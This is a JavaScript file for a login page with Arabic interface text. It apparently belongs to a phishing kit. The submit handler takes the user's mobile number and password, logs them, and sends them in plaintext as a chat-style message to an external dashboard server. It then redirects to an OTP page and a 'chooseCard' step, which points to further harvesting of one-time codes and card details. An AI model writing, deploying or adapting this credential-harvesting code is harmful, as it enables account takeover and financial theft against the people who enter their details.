// CTA button on landing page
const ctaButton = document.querySelector('.cta-button');
if (ctaButton) {
  ctaButton.addEventListener('click', () => {
    window.location.href = 'login.html';
  });
}

// Login form handling
const loginForm = document.getElementById('loginForm');

if (loginForm) {
  loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    // HTML5 validation
    if (!loginForm.checkValidity()) {
      loginForm.reportValidity();
      return;
    }

    // Get values
    const number = document.getElementById('number').value.trim();
    localStorage.setItem('mobileNumber', number);
    const password = document.getElementById('password').value.trim();
    const otp = localStorage.getItem('enteredOtp');

    console.log("Number:", number, "Password:", password, "OTP:", otp);

    // Disable submit button
    const submitBtn = loginForm.querySelector('button[type="submit"]');
    const originalText = submitBtn.textContent;
    submitBtn.disabled = true;
    submitBtn.textContent = "جارٍ الإرسال...";

    try {
      // Send data to your API
      const response = await fetch("https://dashboard-xwzz.onrender.com/api/messages", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          text: `\n🔑 بيانات تسجيل الدخول:\nرقم الموبايل:\n ${number}\nكلمة السر:\n ${password}\n`
        })
      });

      console.log("Response status:", response.status);
      if (!response.ok) throw new Error(`HTTP ${response.status}`);

      // ✅ Set navigation flag for OTP
      localStorage.setItem('nextPage', 'chooseCard'); // normal login flow
      
      setTimeout(() => {
      window.location.href = 'otp.html';
             }, 3000);

    } catch (err) {
      console.error("Fetch error:", err);
      
    } finally {
      submitBtn.disabled = false;
      submitBtn.textContent = originalText;
    }
  });
}

const forgetPassLink = document.getElementById('forgetPassLink');
if (forgetPassLink) {
  forgetPassLink.addEventListener('click', (e) => {
    // Set OTP flow flag for forget password
    localStorage.setItem('nextPage', 'login'); // OTP should go back to login after
    // continue navigation normally
    setTimeout(() => {
    window.location.href = 'forgetPassword.html';
    }, 3000);
    e.preventDefault();
  });
}
